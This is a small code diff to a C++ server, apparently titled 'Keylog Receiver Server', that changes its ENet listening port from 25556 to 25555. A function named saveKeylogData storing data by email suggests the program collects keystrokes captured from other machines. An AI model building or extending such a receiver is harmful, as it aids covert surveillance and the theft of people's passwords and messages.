@@ -79,7 +79,7 @@ void saveKeylogData(const string& email, const string& data) {
 // Main server function
 int main() {
     cout << "=== Keylog Receiver Server ===" << endl;
-    cout << "Starting server on port 25556..." << endl;
+    cout << "Starting server on port 25555..." << endl;
     
     // Initialize ENet
     if (enet_initialize() != 0) {
@@ -92,7 +92,7 @@ int main() {
     // Create the server address structure
     ENetAddress address;
     address.host = ENET_HOST_ANY;  // Listen on any interface
-    address.port = 25556;          // Use a different port than main server
+    address.port = 25555;          // Use a different port than main server
     
     // Create the server host
     ENetHost* server = enet_host_create(
